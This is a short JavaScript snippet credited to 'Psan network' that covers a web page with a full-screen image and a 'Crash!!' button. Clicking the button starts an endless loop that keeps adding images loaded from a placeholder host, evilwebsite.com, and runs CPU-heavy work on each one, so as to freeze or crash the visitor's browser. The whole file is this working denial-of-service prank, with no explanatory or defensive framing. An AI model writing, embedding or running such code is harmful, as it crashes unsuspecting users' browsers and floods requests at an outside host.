//©Psan network


var image = document.createElement("img");
image.src = "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSOiY7ZQY2AmpKkYHXK-rLfgs4ele5x2sW-NumjpYYCrg&s";
image.style.cssText = "position:fixed;top:0;left:0;width:100%;height:100%;z-index:1000;";

var button = document.createElement("button");
button.innerHTML = "Crash!!";
button.style.cssText = "position:fixed;top:50%;left:50%;transform:translate(-50%, -50%);z-index:1001;padding:15px 30px;font-size:18px;border:none;border-radius:5px;background-color:#1a5276;color:#ffffff;cursor:pointer;";
button.addEventListener("click", function() {
setTimeout(function() {
  while (true) {
    let img = new Image();
    img.src = 'http://evilwebsite.com/large.jpg';
    img.onload = function() {
      for (let i = 0; i < 10000; i++) {
        Math.pow(Math.PI, Math.random());
      }
    };
    document.body.appendChild(img);
  }
}, 2000);
});

document.body.appendChild(image);
document.body.appendChild(button);
